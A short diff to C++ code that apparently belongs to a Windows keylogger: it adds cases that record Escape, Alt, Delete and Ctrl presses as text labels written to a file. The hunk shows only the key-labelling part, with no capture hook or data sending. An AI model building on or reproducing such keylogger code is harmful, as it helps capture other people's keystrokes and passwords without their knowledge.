@@ -40,6 +40,30 @@ bool KeyIsListed(int iKey) {
 		//std::cout << " *lclick* ";
 		WriteToFile(" *lclick* ");
 		break;
+	case VK_ESCAPE:
+		//std::cout << " *Escape* ";
+		WriteToFile(" *Escape* ");
+		break;
+	case VK_LMENU:
+		//std::cout << " *lAlt* ";
+		WriteToFile(" *lAlt* ");
+		break;
+	case VK_RMENU:
+		//std::cout << " *rAlt* ";
+		WriteToFile(" *rAlt* ");
+		break;
+	case VK_DELETE:
+		//std::cout << " *Delete* ";
+		WriteToFile(" *Delete* ");
+		break;
+	case VK_LCONTROL:
+		//std::cout << " *lCtrl* ";
+		WriteToFile(" *lCtrl* ");
+		break;
+	case VK_RCONTROL:
+		//std::cout << " *rCtrl* ";
+		WriteToFile(" *rCtrl* ");
+		break;
 	default: return false;
 	}
 	return true;
